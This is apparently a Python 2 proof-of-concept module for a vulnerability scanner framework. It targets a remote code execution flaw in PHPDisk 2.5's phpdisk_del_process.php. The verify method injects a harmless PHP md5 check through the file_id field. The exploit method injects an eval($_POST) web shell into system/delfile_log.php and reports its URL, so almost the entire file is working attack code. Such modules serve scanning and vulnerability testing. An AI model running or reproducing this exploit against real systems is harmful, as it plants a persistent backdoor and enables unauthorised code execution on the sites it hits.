# coding: utf-8
import re
import urllib
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPDisk_0101' # 平台漏洞编号，留空
    name = 'PHPDisk 2.5 /phpdisk_del_process.php 代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-10-20'  # 漏洞公布时间
    desc = '''
    PHPDisk 2.5 /phpdisk_del_process.php 代码执行。
    利用环境比较鸡肋，代码执行需要关闭short_open_tag。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2014-057665
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPDisk'  # 漏洞应用名称
    product_version = '2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '68495b94-5bf1-4125-80b1-e52ee6cda227' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            del_url = self.target + '/phpdisk_del_process.php?a'
            shell_url = self.target + '/system/delfile_log.php'
            data = {
                'pp': 'system/install.lock',
                'file_id': '<?php echo md5(233333);?>#',
                'safe': 'a'
            }
            post_data = urllib.urlencode(data)
            request = urllib2.Request(del_url, post_data)
            response = urllib2.urlopen(request)
            shell_request = urllib2.Request(shell_url)
            shell_response = urllib2.urlopen(shell_request)
            content = shell_response.read()
            match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            del_url = self.target + '/phpdisk_del_process.php?a'
            shell_url = self.target + '/system/delfile_log.php'
            data = {
                'pp': 'system/install.lock',
                'file_id': '<?php echo md5(233333);eval($_POST[bb2];?>#',
                'safe': 'a'
            }
            post_data = urllib.urlencode(data)
            request = urllib2.Request(del_url, post_data)
            response = urllib2.urlopen(request)
            shell_request = urllib2.Request(shell_url)
            shell_response = urllib2.urlopen(shell_request)
            content = shell_response.read()
            match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞；获取的信息：webshell={webshell},content=\'<?php echo md5(233333);eval($_POST[bb2];?>\''.format(
                                target=self.target, name=self.vuln.name, webshell=shell_url))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

if __name__ == '__main__':
    Poc().run()